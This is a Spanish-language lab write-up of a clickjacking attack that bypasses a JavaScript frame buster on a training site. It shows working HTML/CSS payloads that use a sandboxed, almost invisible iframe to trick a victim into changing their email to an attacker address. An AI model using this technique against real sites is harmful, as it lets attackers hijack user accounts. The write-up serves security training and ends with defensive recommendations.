# Lab: Clickjacking with a frame buster script

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: `wiener:peter`

`Note`: The victim will be using Chrome so test your exploit on that browser.  
`Hint`: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---

Iniciamos el laboratorio y nos encontramos con un blog público:
![image](https://github.com/user-attachments/assets/5c74e9ae-8167-4a37-936a-f722cfad0fed)

## 🎯 Objetivo del laboratorio

El objetivo de este laboratorio es realizar un ataque de **Clickjacking** a una aplicación protegida por un **frame buster**. Específicamente, se debe:

- **Engañar al usuario para que cambie su dirección de correo electrónico** a una controlada por el atacante, sin que el usuario lo note.
- **Eludir la protección de frame busting** utilizando técnicas que permitan embeber la página objetivo en un `<iframe>`.
- Crear una **página maliciosa** en el servidor de exploits que simule un botón atractivo (como "Click me") superpuesto al botón real de "Update email" en la página víctima.

💡 El laboratorio se resuelve cuando la dirección de correo electrónico del usuario víctima ha sido cambiada con éxito.

---

Procedemos a autenticarnos con nuestras credenciales `wiener:peter` para inspeccionar la funcionalidad de cambio de correo:
![image](https://github.com/user-attachments/assets/eaefa3dc-9224-418a-a3bc-d6f06520eb40)

Código fuente:
![image](https://github.com/user-attachments/assets/be6cb75e-cd93-4151-8ecd-d849d158ab37)

Observamos el frame buster:
```javascript
if (top != self) {
    window.addEventListener("DOMContentLoaded", function() {
        document.body.innerHTML = 'This page cannot be framed';
    }, false);
}

/*
📌 Explicación detallada:

1. `if (top != self)`:
   - Esta línea verifica si la página actual está siendo cargada **dentro de un frame**.
   - `top` representa el contexto de la ventana principal (el tope del stack de ventanas).
   - `self` representa el contexto del frame actual.
   - Si no son iguales, significa que la página está embebida en un `<iframe>`.

2. `window.addEventListener("DOMContentLoaded", function() { ... })`:
   - Este evento espera a que el contenido HTML de la página se haya cargado completamente, sin esperar imágenes, hojas de estilo, etc.
   - Una vez que se dispara, ejecuta la función definida.

3. `document.body.innerHTML = 'This page cannot be framed';`:
   - Esta línea reemplaza **todo el contenido del body** por un simple texto: `'This page cannot be framed'`.
   - Esto rompe el contenido original, impidiendo al atacante interactuar con los elementos legítimos (como formularios o botones).
*/

```
Objetivo del script:
- Impedir que la página se renderice correctamente si es embebida por un atacante dentro de un iframe.

Cómo lo evitamos:
- Si el `<iframe>` incluye el atributo `sandbox="allow-forms"`, la página embebida **no puede acceder a `top`**, y por lo tanto la condición `top != self` **no puede evaluarse correctamente**.
- Esto neutraliza el frame buster y permite mostrar el contenido sin activar el reemplazo.


Sabemos que se puede prellenar el valor del parámetro `email` tramitándolo por GET:
![image](https://github.com/user-attachments/assets/ea697154-6728-495b-b6a7-3fa0d3a5cad1)


Al igual que en el laboratorio anterior, accedemos al exploit server y procedemos a crean nuestra página maliciosa utilizando nuestro script:
```javascript
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 385px;
        left: 80px;
        z-index: 1;
        background: #fff;
        padding: 10px;
        font-weight: bold;
        cursor: pointer;
    }
</style>

<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
```

Hacemos click en `Store` y luego en `View exploit`:
![image](https://github.com/user-attachments/assets/f29ed268-3e30-4360-98d6-5de2afa2b9cc)

Lo primero a resaltar es que no se activa el Frame Buster, no se activa el mensaje "This page cannot be framed”.

El paso siguiente sería bajar un poco más el texto `Click me` para hacerlo coincidir con el botón `Update email`:
```javascript
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 440px;
        left: 70px;
        z-index: 1;
        background: #fff;
        padding: 10px;
        font-weight: bold;
        cursor: pointer;
    }
</style>

<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
```

![image](https://github.com/user-attachments/assets/98c13fd5-1e2a-47d7-a432-bbc0a84da673)

El siguiente paso es bajarle la opacidad:
```javascript
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 440px;
        left: 70px;
        z-index: 1;
        background: #fff;
        padding: 10px;
        font-weight: bold;
        cursor: pointer;
    }
</style>

<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://0a4a006b0369302b806dd0ee00910067.web-security-academy.net/my-account?email=hacker@evil.com"></iframe>
```
![image](https://github.com/user-attachments/assets/683016b4-3991-4c79-a90a-fc8f74279392)

Con este valor de opacidad logramos que el iframe sea imperceptible, el siguiente paso es nuevamente hacer clic en `Store` y luego clic en `Deliver exploit to victim` para resolver el laboratorio:  

![image](https://github.com/user-attachments/assets/073bbae2-3e81-4aa8-b903-27162b8c6efa)

---
## ✅ Conclusiones

- Se logró ejecutar un ataque de Clickjacking a pesar de que la aplicación estaba protegida con un frame buster basado en JavaScript.
- El uso del atributo `sandbox="allow-forms"` en el iframe demostró ser efectivo para neutralizar el acceso al objeto `top`, evitando así la ejecución del script de defensa.
- La opacidad y el posicionamiento preciso fueron claves para engañar al usuario y superponer correctamente el botón malicioso.

---

## 🔐 Recomendaciones

- Implementar el header HTTP `Content-Security-Policy: frame-ancestors 'none';` o `X-Frame-Options: DENY` para prevenir cualquier intento de embebido, incluso en navegadores modernos.
- Evitar confiar únicamente en soluciones JavaScript para prevenir Clickjacking, ya que pueden ser fácilmente evadidas en contextos restringidos como iframes con sandbox.
- Considerar la validación de acciones sensibles (como cambiar un correo) con mecanismos adicionales como doble confirmación o reautenticación.

---

## 📚 Lecciones aprendidas

- Las protecciones del lado del cliente son fácilmente evadibles si no están reforzadas por mecanismos del lado del servidor.
- HTML y CSS pueden ser utilizados para construir ataques engañosos muy efectivos cuando se combinan con vulnerabilidades de diseño lógico.
- Conocer el comportamiento de los atributos de seguridad como `sandbox` permite evadir controles implementados de forma incompleta o incorrecta.
- La alineación visual y la manipulación del DOM son técnicas comunes en ataques de Clickjacking y deben ser tenidas en cuenta en cualquier análisis de seguridad front-end.





